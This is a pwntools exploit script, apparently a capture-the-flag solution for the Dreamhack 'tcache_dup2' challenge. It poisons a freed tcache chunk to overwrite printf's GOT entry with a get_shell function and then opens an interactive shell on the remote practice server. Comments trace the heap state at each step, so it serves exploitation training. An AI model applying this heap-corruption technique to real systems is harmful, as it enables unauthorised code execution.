from pwn import *

p = remote('host3.dreamhack.games', 17171)
e = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> printf@got
# tc_idx = 1
# chunk : ptr[0]
printf_got = e.got['printf']
modify(0, 0x10, p64(printf_got))


# tcache[0x20] : printf@got
# tc_idx = 0
# chunk : ptr[1]
create(0x20, b'a')


# 여기서 (tc_idx = 0)이기 때문에, printf@got가 malloc되지 않음
# tcache[0x20] : printf@got
# tc_idx = 0
# chunk : ptr[2]
get_shell = e.symbols['get_shell']
create(0x20, p64(get_shell))

p.interactive()
